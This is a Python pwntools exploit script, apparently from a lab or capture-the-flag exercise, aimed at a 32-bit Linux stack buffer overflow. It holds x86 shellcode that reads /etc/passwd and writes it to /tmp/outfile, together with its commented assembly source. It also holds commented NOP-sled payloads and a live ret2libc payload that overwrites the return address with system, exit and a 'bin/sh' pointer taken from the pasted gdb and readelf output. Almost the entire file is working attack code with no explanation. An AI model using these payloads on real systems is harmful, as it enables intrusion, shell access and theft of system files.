from pwn import p32

shell=("\x31\xc0\xb0\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x5c\x24\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\x6a\xff\x5a\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\x68\x66\x69\x6c\x65\x68\x2f\x6f\x75\x74\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x42\x66\x68\xa4\x01\x5a\xcd\x80\x89\xc3\x6a\x04\x58\x89\xf9\x89\xf2\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x05\xcd\x80")

# print(shell)

# print('A'*516 + '\x0d\x62\x55\x56' + 'C'*180)
# print('D'*len(shell) + '\x90'*(516 - len(shell)) + '\xf9\xd4\xff\xff' + 'C'*180)
# print(200*'\x90' + shell + '\x90'*(516 - 200 - len(shell)) + p32(0xffffd4f8) + 'C'*180)
# print('\x90'*(516 - len(shell)) + shell + p32(0xffffd4f8+100) + 'C'*180)

# print(200*'\x90' + shell + '\x90'*(516 - 200 - len(shell)) + p32(0xdeadbeff) + 'C'*180)

#######################################################################################
# root@b6d4ff181a3f:/# readelf -s /lib/i386-linux-gnu/libc.so.6 | grep "system"
#    257: 001391e0   106 FUNC    GLOBAL DEFAULT   16 svcerr_systemerr@@GLIBC_2.0
#    660: 000458b0    63 FUNC    GLOBAL DEFAULT   16 __libc_system@@GLIBC_PRIVATE
#   1532: 000458b0    63 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.0
#######################################################################################
# gdb-peda$ vmmap libc
# Start      End        Perm      Name
# 0xf7dd9000 0xf7df6000 r--p      /usr/lib/i386-linux-gnu/libc-2.30.so
# 0xf7df6000 0xf7f50000 r-xp      /usr/lib/i386-linux-gnu/libc-2.30.so
# 0xf7f50000 0xf7fbf000 r--p      /usr/lib/i386-linux-gnu/libc-2.30.so
# 0xf7fbf000 0xf7fc0000 ---p      /usr/lib/i386-linux-gnu/libc-2.30.so
# 0xf7fc0000 0xf7fc2000 r--p      /usr/lib/i386-linux-gnu/libc-2.30.so
# 0xf7fc2000 0xf7fc4000 rw-p      /usr/lib/i386-linux-gnu/libc-2.30.so
#######################################################################################
# gdb-peda$ p system
# $2 = {int (const char *)} 0xf7e1e8b0 <__libc_system>
# gdb-peda$ p exit
# $5 = {void (int)} 0xf7e112c0 <__GI_exit>
#######################################################################################
# Searching for 'bin' in: None ranges
# Found 31 results, display max 31 items:
#       libc : 0xf7deb369 ("bindtextdomain")
#       libc : 0xf7dec6b9 ("bindresvport")
#       libc : 0xf7ded160 ("bind")
#       libc : 0xf7dedc0f ("bindings")
#       libc : 0xf7deff50 ("bind_textdomain_codeset")
#       libc : 0xf7f6942e ("bin/sh")
#######################################################################################

libc = 0xf7df6000

buffer = "A" * 516
buffer += p32(libc + 0x288b0)
# buffer += p32(0xf7df6000 + 0x000458b0)
buffer += p32(0xf7e112c0)
buffer += p32(0xf7f6942d)
buffer += "EEEE"
print(buffer)

#
# ;Author:        Paolo Stivanin <https://github.com/polslinux>
# ;SLAE ID:       526
#
# global _start
# section .text
# _start:
#     xor eax,eax
#     mov al,0x5
#     xor ecx,ecx
#     push ecx
#     push 0x64777373
#     push 0x61702f63
#     push 0x74652f2f
#     lea ebx,[esp +1]
#     int 0x80
#
#     mov ebx,eax
#     mov al,0x3
#     mov edi,esp
#     mov ecx,edi
#     push WORD 0xffff
#     pop edx
#     int 0x80
#     mov esi,eax
#
#     push 0x5
#     pop eax
#     xor ecx,ecx
#     push ecx
#     push 0x656c6966
#     push 0x74756f2f
#     push 0x706d742f
#     mov ebx,esp
#     mov cl,0102o
#     push WORD 0644o
#     pop edx
#     int 0x80
#
#     mov ebx,eax
#     push 0x4
#     pop eax
#     mov ecx,edi
#     mov edx,esi
#     int 0x80
#
#     xor eax,eax
#     xor ebx,ebx
#     mov al,0x1
#     mov bl,0x5
#     int 0x80
#
